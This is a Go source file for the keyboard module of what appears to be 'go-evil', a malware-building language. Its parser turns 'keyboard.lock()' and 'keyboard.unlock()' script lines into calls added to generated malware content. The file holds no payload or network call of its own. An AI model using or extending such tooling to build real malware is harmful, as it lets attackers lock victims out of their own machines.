package keyboard

import (
	"regexp"

	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

const (
	EXTRACT_SUBDOMAIN      = "(keyboard)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
	EXTRACT_FUNCTION_VALUE = ".+\\(\"(.*)\"\\);"                 // Grabs the value being passed to the function
	EXTRACT_FUNCTION       = "(keyboard)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
)

func Parse(new_line string) {
	regex := regexp.MustCompile(EXTRACT_SUBDOMAIN)
	result := regex.FindAllStringSubmatch(new_line, -1)
	if len(result) > 0 { // There is a subdomain to extract
		subdomain := result[0][2]
		//function := result[0][3]
		switch subdomain {
		default:
			subdomain_error(subdomain)
		}
	} else { // There might be a function which doesn't require a subdomain to work
		regex = regexp.MustCompile(EXTRACT_FUNCTION)
		result = regex.FindAllStringSubmatch(new_line, -1)
		if len(result) > 0 {
			function := result[0][2]
			switch function {
			case "lock":
				mal.AddContent("keyboard.Lock()")
			case "unlock":
				mal.AddContent("keyboard.Unlock()")
			default:
				function_error(function)
			}
		}
	}
}
func subdomain_error(subdomain string) {
	notify.Error("Unknown subdomain '"+subdomain+"'", "keyboard.Parse()")
}
func function_error(function string) {
	notify.Error("Unknown function '"+function+"'", "keyboard.Parse()")
}
